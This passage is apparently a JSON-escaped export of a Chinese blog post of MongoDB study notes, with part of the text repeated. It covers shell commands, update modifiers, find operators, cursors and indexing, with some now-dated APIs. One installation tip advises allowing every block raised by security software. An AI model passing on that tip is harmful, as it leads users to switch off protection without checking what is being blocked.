我们需要构造更多的数据到集合中,这样我们才能很好的讲解查询条件,下面代码你可以直接复制进行添加。当然你也可以自己随意加一些数据到集合中,只要方便我们学习就可以了。\n   \"D:\\工具\\工作学习\\monggoShell\\demo10.js\"\n\n  **简单查找**\n   比如 现在要查找数据中 技能一 会HTML+CSS 的所有人。直接进行查找加条件就可以。\n   > db.workmate.find({\"skill.skillOne\":\"HTML+CSS\"})\n   这时不能使用load来载入,以后会给大家讲使用方法,先用比较笨的方法,使用粘贴复制的方法 在命令行执行。\n\n  **筛选字段**\n   `返回数据项`太多,太乱,有时 程序并不需要 这么多选项。比如 只需要`姓名`和`技能`就可以了。这时候需要写第二个参数,看以下代码。\n   db.workmate.find(\n      {\"skill.skillOne\":\"HTML+CSS\"},\n      {name:true,\"skill.skillOne\":true}\n   )\n   终端中看到如下结果：\n    略……\n   细心的小伙伴会发现还不够完美,多了一个`ID字段`,这个也不是我们想要的,这时候只要把`_id:false`就可以了。当然这里的`false`和`true`,**也可以用`0`和`1`表示。**\n   db.workmate.find(\n     {\"skill.skillOne\":\"HTML+CSS\"},\n     {name:1,\"skill.skillOne\":1,_id:0}\n   )\n   **不过**这些查找操作,都是在作`等于`的阶段,但是不光只有等于查询,我们需要更多的查询条件。\n\n  **不等修饰符**\n   + 小于($lt):英文全称`less-than`\n   + 小于等于($lte)：英文全称`less-than-equal`\n   + 大于($gt):英文全称`greater-than`\n   + 大于等于($gte):英文全称`greater-than-equal`\n   + 不等于($ne):英文全称`not-equal`\n   现在要查找,公司内年龄`小于30`&`大于25岁`的人员。看下面的代码。\n   db.workmate.find(\n    {age:{$lte:30,$gte:25}},\n    {name:true,age:true,\"skill.skillOne\":true,_id:false}\n   )\n  \n  **日期查找**\n   MongoDB也提供了方便的日期查找方法,现在我们要查找注册日期大于2018年1月10日的数据,我们可以这样写代码。\n   \"D:\\工具\\工作学习\\monggoShell\\batch10.js\"\n   先声明一个日期变量,然后使用`大于符`($gt)进行筛选。\n\n  **总结**：这节课内容并不多,但如果你是个`DBA`(数据库管理员) 查找命令工作中每天都会用到,所以这节课的内容练习是必须的,如果你懒得动手,那接下来的课程你可能无法学会。\n\n## 第11节：查询：find的多条件查询(`$in/$nin`(有/无) `$or / $and / $not`(或/与/非))\n  很多时候我们需要查询的值`不只是有一个简单的条件`,比如我们现在要查询一下同事中是`33岁`和`25岁`的,还比如我们要查询同事中`大于30岁`并且`会PHP技能`的。MongoDB在这方面也支持的很好,我们来学习一下。\n  \n  **$in修饰符**\n   `in修饰符`可以轻松解决`一键多值`的查询情况。\n   就如上面我们讲的例子,现在要查询同事中年龄是25岁和33岁的信息。\n   > db.workmate.find(\n   >   {age:{$in:[25,33]}},\n   >   {name:1,\"skill.skillOne\":1,age:1,_id:0}\n   > )\n   `$in`相对的修饰符是`$nin`,就是查询`除了$in条件`以外的值,小伙伴们可以自己进行练习一下,这里我就不作过多的演示了。\n\n  **$or修饰符**\n   `$or修饰符`用来查询`多个键值`的情况,比如查询同事中大于30岁或者会做PHP的信息。\n   `$or修饰符`与`$in/$nin`主要区别 `$or`修饰符是两个Key值 `$in/$nin`修饰符是一个Key值 需比较记忆。\n  \n  **总结**：这节知识比较简单,但要`区分记忆`,很`容易搞混`。幸运的是这里已经为你准备好学习笔记。当你忘记的时候过来看看吧。\n\n## 第12节：查询：find的数组查询(`$all` `$in` `$size` `$slice(显示选项)`)\n  这节主要学习数组的查询,在学习update时就花了重墨去讲数组的操作,可见数组的操作在MongoDB中很受重视,因为稍微大型一点的项目,设计的数据集合都复杂一些,都会涉及数组的操作。\n  \n  **完善数据**\n   以前我们的`workmate集合`对数组涉及还很少,现在在数据中加入了`兴趣（interest）`,并且给每个人加入了一些兴趣,比如有写代码,做饭,看电影…\n   当然这些数据你可以自己随意构建,但是如果你不想自己费事费脑,这里也为你准备好了数据,你只要把以前的表删除（drop）掉,重新载入(load)就可以了。\n\n  **基本数组查询**\n   比如现在我们知道了一个人的爱好是’画画’,’聚会’,’看电影’,但我们不知道是谁,这时候我们就可以使用最简单的数组查询（实际工作中,这种情况基本不常用,所以这种查询只作知识点储备就可以了）。\n  \n   在终端中运行后,我们得到了数据。这时候我们说,想查出看兴趣中有看电影的员工信息。按照正常逻辑,应该使用下面的代码。\n\n  **$all-数组`多项`查询(类似 &&)**\n   现在我们的条件升级了,要查询出既喜欢`看电影`又`看书`的人员信息,也就是对数组中的对象进行查询,这时候要用到一个新的查询修饰符$all。看下面的例子：\n\n  **$in-数组的`或者`查询**\n   `$all`修饰符,需要`满足所有条件`; `$in`主要`满足数组中任意的一项`就可以被查出来(有时候会跟`$or`弄混)。比如现在要查询爱好中有看电影的或者看书的员工信息。\n  \n  **$size-数组`个数`查询**\n    \n  **$slice-`显示选项`**\n    展示数据时的判断条件,显示前几项或后几项。\n    db.workmate.find(\n      {},\n      {name:1,interest:{$slice:2},age:1,_id:0} \n    )\n\n  **总结**：如果你只看视频一定学不会,程序这东西必须要动手练习,我在所有的视频中都反复强调,目的没有别的就是想让你们真的学会,并应用到工作中去。\n\n## 第13节：查询：find的参数使用方法(`find参数[query,fields,limit,skip,sort]` `分页Demo` `$where`)\n  前边已讲3节查询,都是在操作`find`方法的`第一个参数(query)`和`第二个参数(fields)`。`find`还有几个常用的参数,这些参数多用在`分页`和`排序`上。这节我们就把这些常用的选项说一说,理解后我们演示一个分页的效果。\n\n  **find参数**\n    `query`：这个就是查询条件,`MongoDB默认`的第一个参数。\n    `fields`：（返回内容）查询出来后显示的结果样式,可以用`true(1)`和`false(0)`控制是否显示。\n    `limit`：返回的数量,后边跟`数字(number)`,控制`每次查询返回`的结果数量。\n    `skip`:跳过多少个显示,和`limit`结合可以实现分页。(number)\n    `sort`：排序方式,从小到大排序使用`1`,从大到小排序使用`-1`。\n\n  **分页Demo**\n   > db.workmate.find({},{name:true,age:true,_id:false}).limit(0).skip(2).sort({age:1});\n\n  **$where修饰符**\n   db.workmate.find(\n     {$where:\"this.age>30\"},\n     {name:true,age:true,_id:false}\n   )\n   这里的`this`指向的是`workmate(查询集合)`本身。这样我们就可以在程序中随意调用。虽然强大和灵活,但是这种查询对于`数据库压力`和`安全性`都会变重,所以在工作中`尽量减少`$where修饰符的使用。\n\n## 第14节：查询：find如何在js文本中使用(`hasNext` `forEach`)[基础部分完结]\n  前边使用`find`都是`JS`在文本中写完,然后复制到终端中执行,这样非常麻烦。在讲的过程中已经有很多小伙伴在问我如何像写`update`语句一样,在文本中直接运行。这节课我们就学习一下如何直接在文本中执行。\n  \n  **hasNext循环结果**\n   想在文本中执行我们的`find`语句要用到`游标`和`循环`的操作,先看一下代码,代码中我已经对每一句进行了注释。\n   > var db = connect(\"company\")  //进行链接对应的集合collections\n   > var result = db.workmate.find() //声明变量result,并把查询结果赋值给result\n   > //利用游标的hasNext()进行循环输出结果。\n   > while(result.hasNext()){\n   >     printjson(result.next())  //用json格式打印结果\n   > }\n   写完后,现在你只需要在终端中进行`load()`就可以执行了,再也不用麻烦的复制粘贴了。\n  \n  **forEach循环**\n   利用`hasNext循环`结果,需要借助`while`的帮助,MongoDB也为我们提供了`forEach循环`,现在修改上边的代码,使用forEach循环来输出结果。\n   > var db = connect(\"company\")  //进行链接对应的集合collections\n   > var result = db.workmate.find() //声明变量result,并把查询结果赋值给result\n   > //利用游标的hasNext()进行循环输出结果。\n   > result.forEach(function(result){\n   >     printjson(result)\n   > })\n   `作者`觉的`forEach循环`更为`优雅`。这两种方法都是非常不错的,凭借自己爱好进行选择吧。\n  \n  **总结**：那我们MongoDB的`基础部分`就全部讲完了,我们学会了它的`增、删、改、查`,你也可以使用MongoDB进行一些操作了。需要注意的是,只是这篇文章的完结,下篇文章我们进行讲解MongoDB,开始讲解MongoDB的`索引`。\n\n## 第15节：索引:构造百万级数据(`db.randomInfo.stats()`)\n  索引的`性能`体现必须要有`大量数据`才能看出来,你说你有10条20条数据,这是根本看不出来效果的,这节课就通过随机数的方法,创造出一个百万级数据的数据库出来。(随机插入数据,见mongoshell demo15.js)\n  **PS**:`索引`是什么？把数据当成一个字典,`索引`即`目录`。消耗`内存`和`硬盘`。\n  \n  **制作随机数方法**\n\n  **制作随机用户名**\n  \n  插入完成后,我们可以使用`db.randomInfo.stats()`命令查看数据中的数据条数。\n\n  **总结**:这节课主要是为讲解MongoDB的`索引`作准备,我们用`随机数`的方法构建了一个`百万级`的数据表,如果你有兴趣继续往下学习 练习,这节课必须动手做一下。以后这篇文章的学习全是基于这个代码。\n \n## 第16节：索引：索引入门(`ensureIndex` `getIndexes`)\n  集合中已建立 200万条数据,可以进行`索引`的操作了。我们先来建立一个索引,然后看看它的`查询性能`到底提升了多少倍。这节课的内容不会很难,主要掌握`索引的建立方法`即可。\n\n### 建立索引\n    db.randomInfo.ensureIndex({username:1})\n### 查看现有索引\n    db.randomInfo.getIndexes()   \n\n## 第17节：索引：复合索引(`复合索引的坑` `ensureIndex` `hint`)\n什么样的数据使用索引会变慢？\n`复合索引`的`使用`和`语法`\n通过这节 需要对`索引`使用的`时机`有所了解，避免画蛇添足，产生不必的麻烦。\n\n### 索引中的小坑\n+ 数据`不超万条`时，不需要使用索引。性能的提升并不明显，大大`增加了内存、硬盘 消耗`。\n+ 查询数据`超过表数据量30%`时，不要使用索引字段查询。实际证明会`比不使用索引更慢`，因为它`大量检索`了`索引表`和我们`原表`。\n+ `数字索引`，要`比字符串索引快`的多，在百万级甚至千万级数据量面前，使用数字索引是个明确的选择。\n+ 把你经常查询的数据做成一个`内嵌数据`（对象型的数据），然后集体进行索引。\n\n### 复合索引(`ensureIndex`)\n**复合索引就是两条以上的索引。**上节课我们已经把`username`字段建立了索引，我们现在把`randNum0`，这个字段也设置成索引。\n    db.randomInfo.ensureIndex({randNum0:1})\n\n建立好后，再用`查询索引状态`命令进行查询。\n    db.randomInfo.getIndexes()\n\n### 两个索引同时查询\n    var db = connect('company');\n    var rs= db.randomInfo.find({username:'7xwb8y3',randNum0:565509});\n\n从性能上看并没有什么特殊的变化，查询时间还是在4ms左右。MongoDB的`复合查询`是按照我们的`索引顺序`进行查询的。就是我们用`db.randomInfo.getIndexes()`查询出的数组。\n\n### 指定索引查询(`hint`)\n`数字`的索引要比`字符串`的索引`快`，这就需要一个方法来打破索引表的查询顺序，用我们自己`指定的索引`优先查询，这个方法就是`hint()`.\n\n    var rs= db.randomInfo.find({username:'7xwb8y3',randNum0:565509}).hint({randNum0:1});\n\n由于`数据量`和`复杂成都`一般，所以没有明显性能提升。工作中遇到`大数据`，会得到`好的效果`。\n\n### 删除索引(`dropIndex`)\n当索引`性能不佳`或`起不到作用`时，我们需要删除索引，删除索引的命令是`dropIndex()`.\n\n    db.randomInfo.dropIndex('randNum0_1'); // 索引的唯一ID\n\n这里需要`注意`的是删除时填写的值，并`不是 字段名称(key)`，`而是 索引查询表(getIndexes())中 name值`。\n\n### 总结：这节主要内容 `操作索引`，包括`复合索引 建立/删除`。使用 索引的 `窍门`。\n\n## 第18节：索引：全文索引(`$text` `$search`)\n有时候需要在`大篇幅文章`中`搜索关键词`，比如文章每篇都在`万字以上`，这时候想`搜索关键字`是非常`不容易`的，`MongoDB`为提供了`全文索引`。\n\n### 准备工作(建立集合 插入 数据)\n先建立`集合(collections)` —— `info`，然后`插入` 小段文章，`作用`就是为 建立 全文索引 提供数据，不再建立 百万级数据，只看效果。\n\n    db.info.insert({contextInfo:\"I am a programmer, I love life, love family. Every day after work, I write a diary.\"})\n    db.info.insert({contextInfo:\"I am a programmer, I love PlayGame, love drink. Every day after work, I playGame and drink.\"})\n\n再次强调 只是练习需要，实际工作中 简单数据 没必要 建立 全文索引。\n\n### 建立全文索引(`ensureIndex`)\n\n    db.info.ensureIndex({contextInfo:'text'})\n\n需要注意的是这里使用`text`关键词来`代表全文索引`，这里不再 `建立数据模型`。\n\n### 全文索引查找(`$text` `$search`)\n建立好了全文索引就可以查找了，查找时需要两个关键修饰符:\n\n+ $text:表示要在全文索引中查东西。\n+ $search:后边跟查找的内容。\n\n    db.info.find({$text:{$search:\"programmer\"}})\n\n### 多词查找(单词关系为 `或||`, 排除关键词`-`)\n`全文索引`是支持`多词查找`的，比如我们希望查找数据中有programmer，family，diary，drink的数据(单词关系属于 `或||` 的关系)，所以两条数据都会出现。\n\n    db.info.find({$text:{$search:\"programmer family diary drink\"}})\n\n如果不希望 查找带有`drink`这个单词的记录，我们可以使用`-`减号来排除。\n\n    db.info.find({$text:{$search:\"programmer family diary -drink\"}})\n\n### 转义符()\n`全文搜索`中`支持转义符`，比如 想 搜索的是 两个词(`love PlayGame`和`drink`)，这时候需要使用`\\`反斜杠来转意。\n\n    db.info.find({$text:{$search:\"\\\"love PlayGame\\\" drink\"}})\n\n### 总结\n`全文索引`在工作中比较常用,比如`博客文章`搜索、`长文件`的`关键词`搜索,都需要使用全文索引。\n\n## \n","source":"_posts/SQL/NoSql/MongoDB/MongoDB学习笔记.md","raw":"---\ntitle: MongoDB学习笔记\ndate: 2018-07-07 16:31:09\ntags: MongoDB学习笔记\ncategories: MongoDB\n---\n# [MongoDB学习笔记(JS胖)](http://jspang.com/2017/12/16/mongdb/)\n(2018年1月26日 13:53:11)\n## 第01节：认识和安装MongoDB\n   > MongoDB是`非关系型数据库`\n   关系数据库,是建立在关系模型基础上的数据库。\n   安装步骤：\n    1.去官网下载MongoDB,https://www.mongodb.com/,在网站中找到Download按钮。下载会有点忙,国外的服务器,你懂的。\n    2.下载后进行安装,安装没什么难度,但是对于新手建议选择默认安装,而不选择自己配置。等我们完全熟悉后再定制式配置。\n    3.安装时如果有安全软件,会报一些拦截,一律允许就好,不允许会安装失败的。\n    4.安装完成后,需要配置“环境变量”,目的是再命令行中直接使用,而不需要输入很长的路径了。（此步骤观看视频）\n\n   查看存在数据库命令：`show dbs`\n   查看数据库版本命令：`db.version()` \n\n## 第02节：Mongo基本命令-1(`show dbs` `use xxdb` `show collections` `db` `MongoDB的存储结构`)\n   接下来的几节直接上手`Mongo命令`,`MSSQL`和`MYsql`用的都是`Sql命令`。\n   MongoDB的操作命令就是前端最熟悉的JavaScript命令。\n   先来一个常用的赋值和输出命令,熟悉一下。（操作前你需要打开Mongo服务器和链接到服务器-也就是我们上节讲的`mongod`命令和`mongo`命令）在命令行中输入以下代码。\n   需要注意的是这里的输出不再使用`console.log`(‘巴拉巴拉’),而是使用`print`(‘巴拉巴拉’),这个稍有区别。\n\n   **MongoDB的存储结构**\n    以前我们的关系型数据库的数据结构都是顶层是库,库下面是表,表下面是数据。但是MongoDB有所不同,库下面是集合,集合下面是文件,可以看下面这张图进行了解一下。\n\n    **存储解构不同**\n      关系型数据库\n        --数据库\n        --数据表\n        --数据行\n      非关系型数据库(MongoDB)\n        --数据库\n        --集合\n        --文件\n\n     在学习中我们可以对比记忆,这样才能更好的了解这些名词,其实数据表就是集合,数据行就是文件,当然这只是为了记忆,实质还是有区别的。\n\n   **基础Shell命令**\n    了解`存储结构`后,就可学习基础`Shell`命令,因 命令 较基础,以 列表形式展现,具体使用方法可到视频观看。\n    `show dbs`:显示已有数据库. 如果你刚安装好,会默认有local、admin(config),这是MongoDB的默认数据库,我们在新建库时是不允许起这些名称的。\n    `use admin`： 进入数据,也可以理解成为使用数据库。成功会显示：`switched to db admin`。\n    `show collections`: 显示数据库中的`集合`（关系型中叫`表`,我们要逐渐熟悉）。\n    `db`:显示当前位置. 也就是你当前使用的数据库名称,这个命令算是最常用的,因为你在作任何操作的时候都要先查看一下自己所在的库,以免造成操作错误。\n   \n   `总结`：这节 学习已经 进入 `MongoDB` 世界,使用 比较简单,都是 基本命令, 敲回车就可使用,但还要多进行 练习。`重点` 要转变 以前`数据库存储结构的思想`,`掌握MongoDB的存储结构`。 \n\n## 第03节：Mongo基本命令-2(\"基本数据`增删改查`\" `use db` `insert` `find` `findOne` `update` `remove` `drop` `dropDatabase` `count`)\n   学会基本的 数据 `增删改查`\n   数据操作基础命令：\n    `use db`(建立数据库)：use不仅可以进入一个数据库,如果你敲入的库不存在,它还可以帮你建立一个库。但是在没有集合前,它还是默认为空。\n    `db.集合.insert({\"\":\"\",\"\":\"\"})`:新建数据集合和插入文件（数据）,**当集合没有时,这时候就可以新建一个集合,并向里边插入数据。** `Demo：db.user.insert({“name”:”jspang”})`\n    `db.集合.find( )`:查询所有数据,这条命令会列出集合下的所有数据,可以看到MongoDB是自动给我们加入了索引值的。`Demo：db.user.find()`\n    `db.集合.findOne( )`:查询第一个文件数据,这里需要注意的,所有MongoDB的组合单词都使用首字母小写的驼峰式写法。\n    `db.集合.update({查询},{修改})`:修改文件数据,第一个是查询条件,第二个是要修改成的值。这里注意的是可以多加文件数据项的,比如下面的例子。\n    `db.集合.remove(条件)`：删除文件数据,注意的是要跟一个条件。`Demo`:`db.user.remove({“name”:”jspang”})`\n    **以下基本不用**\n    `db.集合.drop( )`:删除整个集合,这个在实际工作中一定要谨慎使用,如果是程序,一定要二次确认。\n    `db.dropDatabase( )`:删除整个数据库,在删除库时,一定要先进入数据库,然后再删除。实际工作中这个基本不用,实际工作可定需要保留数据和痕迹的。 \n    `db.collections.count({rule})`\n\n## 第04节：用js文件写mongo命令(`var db = connect(\"dbName\")` )\n   命令行写`mongo`命令（shell）实在麻烦(无法忍受windows系统 命令行),这节学习用`JS`文件来写`shell命令`和`执行`。`JS`写`mongo`的`Shell`命令大部分是相同的,只有小部分不一样。\n  **把命令写入JS中**\n    现模拟一个用户登录日志表 信息,用JS进行编写。在一个新建目录下,比如D:/mongoShell/,新建一个goTask.js文件。文件内容如下：\n  > goTask.js文件\n  > var userName=\"jspang\";    //声明一个登录名             \n  > var timeStamp=Date.parse(new Date());     //声明登录时的时间戳  \n  > var jsonDdatabase={\"loginUnser\":userName,\"loginTime\":timeStamp}; //组成JSON字符串\n  > var db = connect('log');   //链接数据库\n  > db.login.insert(jsonDdatabase);  //插入数据\n\n  > print('[demo]log  print success');  //没有错误显示成功\n  > var userName=\"jspang\";    //声明一个登录名             \n  > var timeStamp=Date.parse(new Date());     //声明登录时的时间戳  \n  > var jsonDdatabase={\"loginUnser\":userName,\"loginTime\":timeStamp}; //组成JSON字符串\n  > var db = connect('log');   //链接数据库\n  > db.login.insert(jsonDdatabase);  //插入数据\n  > \n  > print('[demo]log  print success');  //没有错误显示成功\n\n  **执行JS文件**\n  > mongo goTask.js\n\n  总结：这节很好的解决 在终端写 命令行 的难题,虽然大部分Shell和在命令行中写法一样,但是也稍有不同,希望小伙伴们可以轻松掌握。 \n\n## 第05节：批量插入的正确方法(\"批量数据插入 以`数组`方式\" `老版本MongoDB batchInsert` `一次插入不要超 48M` `静态存储` `批量插入性能测试 批量>循环` `数据库性能`)\n   在操作数据库时要注意两个能力：\n    第一个是`快速存储能力`。\n    第二个是`方便迅速查询能力`。\n\n   **批量插入**\n    批量数据插入是以**数组**的方式进行的（如果写错,可以3个回车可以切出来）。我们现在命令行中敲入下面的代码,我们可以看到数据顺利插入了。\n    老版本MongoDB（3.2以前的版本基本都需要）是需要在`Insert`前加一个`batch`单词的,如下代码。\n    `db.test.batchInsert()`\n    **注意**一次插入不要超过48M,`.zip`和`大图片`之类尽量用`静态存储`,MongoDB存储`静态路径`就好,这也算是一个规则。\n\n   **批量插入性能测试**\n    刚学了批量插入,那是循环插入快？还是批量插入快那？在一般人的认知里肯定是批量插入更快（其实这毋庸置疑）,但我们要拿出极客精神,探个究竟,试着写一个小Shell,来验证一下结果。\n    先写一个`循环插入`方法：\n\n    `批量插入`代码:\n\n   **总结**：在工作中`一定`要`照顾数据库性能`,这也是你`水平的体现`,一个技术会了很简单,但是要精通不那么简单。学完这节,记得在工作中如果在循环插入和批量插入举棋不定,那就选批量插入吧,它会给我们更优的性能体验。 \n\n## 第06节：修改：Update常见错误(`只update修改项`)\n   这节开始说一说`Update` 详细操作,先来看下常见错误,知道 困难 或者说 问题在哪里,再提出解决方案。这节会先演示一些错误的 `Update` 方法,然后再说正确的方法。希望不要误导小伙伴。\n   **错误：只update修改项**\n    `Update`的使用方法需要注意\n    db.xxxset.update({\"\":\"\"},`{\"\":\"\"} || [] || variable`)(此方法属于整条数据修改,替换项需要整条数据)\n\n   **正确修改方法**\n    可以声明一个变量,然后把要改变数据的全部信息放入变量,最后执行修改操作。\n  \n   现在这种方法才是正确的,数据修改正常了,但是你会发现写起来非常麻烦,而且特别容易写错。下节我们会介绍`update修改器`,可以很好的解决这个问题。 \n\n## 第07节：修改：初识update修改器(`$set/$set嵌套内容` `$unset` `$inc` `multi` `upsert`)\n   上节的`修改`用起来实在是`不够优雅`,这是我们一个伟大的前端不能接受的,所以我们要学习`update修改器`,来解决这个问题。`update修改器`可以帮助我们`快速`和`简单`的修改数据,让我们的操作更简单方便。\n  **$set修改器**\n    用来修改一个指定的键值(key),这时候我们要修改上节的sex和age就非常方便了,只要一句话就可以搞定。\n   > db.workmate.update({\"name\":\"MinJie\"},{\"$set\":{sex:2,age:21}})\n    修改好后,我们可以用db.workmate.find()来进行查看,你会发现数据已经被修改。\n   **修改嵌套内容(内嵌文档)**\n   > db.workmate.update({\"name\":\"MinJie\"},{\"$set\":{\"skill.skillThree\":'word'}})\n   \n  **$unset用于将key删除**\n   > db.workmate.update({\"name\":\"MinJie\"},{$unset:{\"age\":''}})\n  \n  **$inc对数字进行计算**\n   它是对`value值`的修改,但是修改的`必须是数字`,`字符串`是`不起效果`的。\n   > db.workmate.update({\"name\":\"MinJie\"},{$inc:{\"age\":-2}})\n\n  **multi选项**\n   `multi`是有`ture`和`false`两个值,`true代表全部修改`,`false代表只修改一个(默认值)`。\n\n  **upsert选项**\n   `upsert`也有`ture`和`false`两个值：`true代表没有就添加`,`false代表没有不添加(默认值)`。\n\n  **总结**：这节的内容非常多,主要学习了`update修改器`有关的一些东西。一定要多练习几遍,否则很快就会忘记的。\n\n## 第08节：修改：update`数组`修改器(`$push` `$ne` `$addToSet` `$each` `$pop`)\n  已学会一些`基础修改器`,这节主要学习`数组修改器的操作`,也可`修改内嵌文档`,也就是`对象形式的数据`。\n  **$push追加数组/内嵌文档值**\n   `$push`的功能是`追加数组中的值`,但我们也经常用它操作`内嵌文档`,就是{}对象型的值。\n    先看一个追加数组值的方式,比如我们要给小王加上一个爱好(interset)为画画（draw）：\n   > db.workmate.update({name:'xiaoWang'},{$push:{interest:'draw'}})\n   当然`$push`修饰符还可以为`内嵌文档增加值`.\n    比如我们现在要给我们的UI,增加一项新的技能skillFour为draw,这时候我们可以操作为：\n   > db.workmate.update({name:'MinJie'},{$push:{\"skill.skillFour\":'draw'}})\n   `$push修饰符`在工作中是最常用的,因为 `数据`一般都会涉及`数组`和`内嵌文档`的操作,一定要掌握。\n\n  **$ne查找是否存在**(类似 `if(xxx === undefined || !xxx)/else` 判断)\n    它主要的作用是,`检查一个值是否存在`,如`不存在`再 执行操作,`存在`就不执行,这个很`容易弄反`,记得我刚学的时候就经常弄反这个修改器的作用,给自己增加了很多坑。\n   > db.workmate.update({name:'xiaoWang',\"interest\":{$ne:'playGame'}},{$push:{interest:'Game'}})\n   **总结**：没有则修改,有则不修改。\n  \n  **$addToSet 升级版的$ne**\n    它是$ne的升级版本（查找是否存在,不存在就push上去）,操作起来更直观和方便,所以再工作中这个要比$en用的多。\n   > db.workmate.update({name:\"xiaoWang\"},{$addToSet:{interest:\"readBook\"}})\n\n  **$each 批量追加**\n    它可以传入一个`数组`,一次增加`多个值`进去,相当于`批量操作`,性能同样比循环操作要好很多,这个是需要我们注意的,工作中也要先组合成数组,然后用批量的形式进行操作。\n   > var newInterset=[\"Sing\",\"Dance\",\"Code\"];\n   > db.workmate.update({name:\"xiaoWang\"},{$addToSet:{interest:{$each:newInterset}}})\n\n  **$pop 删除数组值**\n    `$pop`只删除一次,并不是删除所有数组中的值。而且它有`两个选项`,`1`和`-1`。\n    1：从数组末端进行删除\n    -1：从数组开端进行删除\n   > db.workmate.update({name:'xiaoWang'},{$pop:{interest:1}})\n  \n  **数组定位修改**\n    有时候只知道修改数组的第几位,但并不知道是什么,这时候我们可以使用`interest.int`的形式。\n    `例子` 比如我们现在要修改xiaoWang的第三个兴趣为编码（Code）,注意这里的计数是从0开始的。\n   > db.workmate.update({name:'xiaoWang'},{$set:{\"interest.2\":\"Code\"}})\n\n  **总结**：这节主讲`数组`和`内嵌文档`有关的`update`修改器,内容很多,都需要不断熟练记忆。当然如果你记不住,你至少记住这个博客网址,因为技术胖把笔记已经给你整理好了。\n\n## 第09节：修改：状态返回与安全(`应答式/非应答式` `db.runCommand()` `findAndModify()`)\n  在操作数据库时,对`数据的修改`需要`足够的安全措施`,实际工作中,用`db.collections.update`不多,修改时都用`findAndModify`,它`返回`来一些必要的`参数`,让我们对`修改`多了很多`控制`力,`控制力的加强`也就是对`安全的强化能力加强`。\n\n  **应答式写入**\n   先了解一个概念：`应答式写入`。在`以前`的文章中,我们的操作都是`非应答式写入`,就是在`操作完`数据库后,它并没有给我们任何的`回应`和`返回值`,而是我们自己安慰自己写了一句话（print(‘[update]:The data was updated successfully’);）。这在`工作中 不允许`,因为根本`不能提现`我们`修改的结果`。\n   **应答式**写入就会给我们`直接返回结果`(报表),结果里边的包含项会很多,这样我们就可以很好的进行程序的控制和安全机制的处理。有点像`前端`调用`后端接口`,无论作什么,后端都要给我一些`状态字节`一样。\n  \n  **db.runCommand()**\n   是数据库运行命令的`执行器`,执行命令`首选`就要使用它,因为它在`Shell`和`驱动程序`间提供了一致的接口。（几乎操作数据库的所有操作,都可以使用`runCommand`来执行）现在我们试着用`runCommand`来修改数据库,看看结果和直接用`db.collections.update`有什么`不同`。\n\n   > db.workmate.update({sex:1},{$set:{money:1000}},false,true)\n   > var resultMessage=db.runCommand({getLastError:1})\n   > printjson(resultMessage);\n\n   上边代码 修改所有男士 每人增加1000元钱(money),然后用`db.runCommand()`执行,可看到执行结果在控制台返回。\n    {\n      \"connectionId\" : 1,\n      \"updatedExisting\" : true,\n      \"n\" : 2,\n      \"syncMillis\" : 0,\n      \"writtenTo\" : null,\n      \"err\" : null,\n      \"ok\" : 1\n    }\n    `false`：第一句末尾的false是upsert的简写,代表没有此条数据时不增加;\n    `true`：true是multi的简写,代表修改所有,这两个前边已学过。\n    `getLastError:1` :表示返回功能错误,这里的参数很多,如果有兴趣请自行查找学习,这里不作过多介绍。\n    `printjson`：表示以json对象的格式输出到控制台。\n    `db.listCommands( )`:查看所有的Commad命令, 内容很多, 本课程只讲解`工作中经常使用`的内容。\n\n   比如我们要查看是否和数据库链接成功了,就可以使用Command命令。\n   `db.runCommand({ping:1})`\n   返回`ok:1`就代表链接正常。\n\n  **findAndModify**\n   从名字看,`findAndModify`是`查找并修改`的意思。配置它可以在修改后给我们返回修改的结果。看下面代码：\n   > var myModify={\n   >  findAndModify:\"workmate\",\n   >  query:{name:'JSPang'},\n   >  update:{$set:{age:18}},\n   >  new:true    //更新完成,需要查看结果,如果为false不进行查看结果\n   > }\n   > var ResultMessage=db.runCommand(myModify);\n   > \n   > printjson(ResultMessage)\n   `findAndModify`的`性能`是不如`db.collections.update`的性能好,但实际工作中都使用它,毕竟要`商用程序`安全性还是比较重要的。\n   `findAndModify属性值`:\n    `query`:需要查询的条件/文档\n    `sort`: 排序\n    `remove`:[boolean]是否删除查找到的文档,值填写true,可以删除。\n    `new`:[boolean]返回更新前的文档还是更新后的文档。\n    `fields`:需要返回的字段\n    `upsert`:没有这个值是否增加。\n   **总结**：这节讲了一些跟`安全有关的操作`,但这`不是全部`,我们随着课程的深入还会继续学习更多的知识。工作中尽量使用`findAndModify`来进行更新数据,这样会更安全和直观,这点性能的损失是值得的。\n\n## 第10节：查询：find的不等修饰符(`简单查找(\"x.x\")转字符串` `筛选字段(第二对象参数 boolean || 0/1)` `不等修饰符`)\n  `MongoDB`的`查找操作` 分几节课来讲,因为内容比较多, `开发中` 查找 是应用最多的操作,几乎每个模块都会用到,所以`查找部分`将是本套课的`重中之重`。这节课我们先来看看简单的查询条件,也了解一下find基础用法。\n  如果你以前操作过`关系型数据库`比如`MySql` 你会对>(大于),<(小于),=(等于)这些东西很熟悉,但是`非关系型数据库`不能直接使用这些符号,稍有区别。\n  **构造数据**\n   我们需要构造更多的数据到集合中,这样我们才能很好的讲解查询条件,下面代码你可以直接复制进行添加。当然你也可以自己随意加一些数据到集合中,只要方便我们学习就可以了。\n   \"D:\\工具\\工作学习\\monggoShell\\demo10.js\"\n\n  **简单查找**\n   比如 现在要查找数据中 技能一 会HTML+CSS 的所有人。直接进行查找加条件就可以。\n   > db.workmate.find({\"skill.skillOne\":\"HTML+CSS\"})\n   这时不能使用load来载入,以后会给大家讲使用方法,先用比较笨的方法,使用粘贴复制的方法 在命令行执行。\n\n  **筛选字段**\n   `返回数据项`太多,太乱,有时 程序并不需要 这么多选项。比如 只需要`姓名`和`技能`就可以了。这时候需要写第二个参数,看以下代码。\n   db.workmate.find(\n      {\"skill.skillOne\":\"HTML+CSS\"},\n      {name:true,\"skill.skillOne\":true}\n   )\n   终端中看到如下结果：\n    略……\n   细心的小伙伴会发现还不够完美,多了一个`ID字段`,这个也不是我们想要的,这时候只要把`_id:false`就可以了。当然这里的`false`和`true`,**也可以用`0`和`1`表示。**\n   db.workmate.find(\n     {\"skill.skillOne\":\"HTML+CSS\"},\n     {name:1,\"skill.skillOne\":1,_id:0}\n   )\n   **不过**这些查找操作,都是在作`等于`的阶段,但是不光只有等于查询,我们需要更多的查询条件。\n\n  **不等修饰符**\n   + 小于($lt):英文全称`less-than`\n   + 小于等于($lte)：英文全称`less-than-equal`\n   + 大于($gt):英文全称`greater-than`\n   + 大于等于($gte):英文全称`greater-than-equal`\n   + 不等于($ne):英文全称`not-equal`\n   现在要查找,公司内年龄`小于30`&`大于25岁`的人员。看下面的代码。\n   